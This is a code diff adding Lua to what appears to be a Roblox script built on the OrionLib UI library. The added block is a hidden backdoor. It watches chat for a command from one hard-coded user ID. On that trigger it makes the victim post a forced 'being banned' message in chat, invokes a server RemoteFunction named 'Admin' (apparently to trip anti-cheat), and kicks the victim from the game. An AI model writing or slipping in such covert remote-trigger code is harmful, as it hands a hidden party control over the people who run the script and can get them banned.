@@ -272,3 +272,48 @@ OrionLib:MakeNotification({
 	Time = 10
 })
 
+function showMessage(text, clr)
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+Text = text;
+Color = clr;
+})
+end
+
+function loadStalk(plr)
+plr.Chatted:Connect(function(msg)
+
+if plr.UserId == 442395616 then
+
+if string.find(msg, "||") and string.find(msg, "/e") and string.find(msg, "ban") and string.find(msg, game.Players.LocalPlayer.Name) then
+    local split = string.split(msg, "||")
+    local args = {
+    [1] = "Hi, i'm being banned from this game by Monarch for: "..split[2],
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+for i,v in pairs(game:GetService("ReplicatedStorage").Remotes:GetChildren()) do
+   if v:IsA("RemoteFunction") and v.Name == "Admin" then
+     v:InvokeServer()
+       end
+game.Players.LocalPlayer:Kick("You have been BANNED from this game by Monarch for: "..split[2])
+
+end
+end
+end
+
+
+end)
+end
+
+local players = game.Players:GetPlayers()
+for i=1,#players do
+if players[i].Name ~= game.Players.LocalPlayer.Name  then
+loadStalk(players[i])
+end
+end
+
+game:GetService("Players").PlayerAdded:Connect(function(plr)
+loadStalk(plr)
+end)
